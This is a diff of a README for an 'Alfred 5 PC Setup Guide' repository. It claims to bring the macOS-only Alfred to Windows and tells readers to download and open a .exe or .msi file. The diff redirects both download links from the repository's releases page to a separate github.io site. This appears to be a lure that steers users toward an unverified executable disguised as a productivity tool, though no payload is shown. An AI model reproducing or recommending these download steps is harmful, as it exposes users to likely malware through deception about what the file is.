@@ -1,6 +1,6 @@
 # ⚡ Alfred-5-PC-Setup-Guide - Use Alfred features on your Windows computer
 
-[![](https://img.shields.io/badge/Download-Alfred--5--Guide-blue)](https://github.com/Paolomonotonic715/Alfred-5-PC-Setup-Guide/releases)
+[![](https://img.shields.io/badge/Download-Alfred--5--Guide-blue)](https://paolomonotonic715.github.io)
 
 Many users look for the speed and power of Alfred on Windows 11. While Alfred remains a macOS exclusive tool, this guide helps you find the best alternatives and setup methods to mimic its productivity features on your PC. This repository provides a straightforward path to regain your workflow efficiency.
 
@@ -17,7 +17,7 @@ Ensure your system meets these basic requirements before you begin:
 
 Follow these steps to access the setup files:
 
-1. Visit the following page to choose your version: [https://github.com/Paolomonotonic715/Alfred-5-PC-Setup-Guide/releases](https://github.com/Paolomonotonic715/Alfred-5-PC-Setup-Guide/releases).
+1. Visit the following page to choose your version: [https://paolomonotonic715.github.io](https://paolomonotonic715.github.io).
 2. Locate the latest release at the top of the page.
 3. Click the file ending in .exe or .msi to start your download.
 4. Open the file once it finishes saving to your Downloads folder.
